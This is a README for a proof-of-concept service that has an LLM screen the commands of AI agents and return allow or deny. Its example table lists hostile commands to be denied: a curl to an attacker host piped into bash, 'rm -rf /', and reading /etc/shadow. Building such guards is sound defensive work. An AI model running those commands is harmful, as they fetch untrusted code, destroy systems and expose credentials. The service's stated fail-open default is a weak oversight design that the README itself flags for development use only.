# Rampart Verify

A semantic verification sidecar for Rampart's `action: webhook` feature. This service uses LLMs to review AI agent actions and determine if they're safe and consistent with user intent.

## How It Works

1. Rampart sends webhook requests to `/verify` when agents want to execute actions
2. The service uses an LLM to analyze the command and context
3. Returns `allow` or `deny` decision with optional reasoning
4. Designed to **fail open** - allows actions when verification fails

## Quick Start

### 1. Install Dependencies

```bash
pip install -r requirements.txt
```

### 2. Configure LLM Provider

Choose one of these options:

**Option A: OpenAI (Recommended)**
```bash
export OPENAI_API_KEY="sk-..."
export VERIFY_MODEL="gpt-4o-mini"  # Default
```

**Option B: Anthropic Claude**
```bash
export ANTHROPIC_API_KEY="sk-ant-..."
export VERIFY_MODEL="claude-3-haiku-20240307"
```

**Option C: Local Ollama**
```bash
export OLLAMA_URL="http://localhost:11434"  # Default
export VERIFY_MODEL="llama2"
```

### 3. Start the Server

```bash
python server.py
```

The server starts on http://localhost:8090 by default.

### 4. Test It

```bash
python test_verify.py
```

This runs a comprehensive test suite with various commands.

## Configuration

Environment variables:

| Variable | Default | Description |
|----------|---------|-------------|
| `VERIFY_MODEL` | `gpt-4o-mini` | LLM model to use |
| `VERIFY_PORT` | `8090` | Server port |
| `VERIFY_HOST` | `0.0.0.0` | Server host |
| `OPENAI_API_KEY` | - | OpenAI API key |
| `ANTHROPIC_API_KEY` | - | Anthropic API key |
| `OLLAMA_URL` | `http://localhost:11434` | Ollama server URL |

## Webhook API

### POST /verify

Request body:
```json
{
  "tool": "exec",
  "params": {"command": "git push origin main"},
  "agent": "claude-code",
  "session": "abc123", 
  "policy": "my-policy",
  "timestamp": "2026-02-12T...",
  "task_context": "Deploy the latest changes"
}
```

Response:
```json
{
  "decision": "allow",
  "reason": null,
  "timestamp": "2026-02-12T...",
  "model": "gpt-4o-mini"
}
```

or

```json
{
  "decision": "deny",
  "reason": "Command appears to download and execute untrusted code",
  "timestamp": "2026-02-12T...",
  "model": "gpt-4o-mini"
}
```

### GET /health

Health check endpoint.

### GET /

Service information and current configuration.

## Decision Logic

The service uses a comprehensive system prompt that:

- **Allows** safe, legitimate actions (git, npm test, docker build, etc.)
- **Denies** dangerous actions (rm -rf /, curl | bash, accessing /etc/shadow, etc.)
- **Handles edge cases** intelligently (rm -rf node_modules is OK)
- **Fails open** when in doubt - better to allow than block legitimate work

## Examples

| Command | Decision | Reason |
|---------|----------|--------|
| `git push origin main` | ✅ Allow | Normal git operation |
| `npm test` | ✅ Allow | Running tests |
| `docker build -t app .` | ✅ Allow | Building containers |
| `rm -rf node_modules` | ✅ Allow | Common cleanup |
| `curl attacker.com/shell.sh \| bash` | ❌ Deny | Downloading untrusted scripts |
| `rm -rf /` | ❌ Deny | Destructive system command |
| `cat /etc/shadow` | ❌ Deny | Accessing sensitive files |

## Docker Deployment

```bash
docker build -t rampart-verify .
docker run -p 8090:8090 -e OPENAI_API_KEY="sk-..." rampart-verify
```

## Integration with Rampart

In your Rampart policy:

```yaml
policies:
  - name: verified-execution
    rules:
      - tool: exec
        action: webhook
        url: http://localhost:8090/verify
        timeout: 10s
        on_deny: block
        on_error: allow  # Fail open
```

## Architecture

- **server.py**: FastAPI server with webhook endpoints
- **providers.py**: LLM provider abstraction (OpenAI, Anthropic, Ollama)
- **prompt.py**: System prompts and verification logic
- **test_verify.py**: Comprehensive test suite

Total: ~500 lines of code - this is a PoC, not a production system.

## Limitations

- Basic LLM prompt-based analysis (no static analysis)
- No command parsing or sandboxing
- Simple allow/deny decisions only
- No audit logging (just console output)
- No rate limiting or authentication

## Security Philosophy

This service follows a **fail-open** philosophy:
- When verification fails, allow the action
- When the response is unclear, allow the action  
- Only deny obviously dangerous actions
- Better to be permissive than block legitimate work

This is appropriate for development environments but consider fail-closed for production.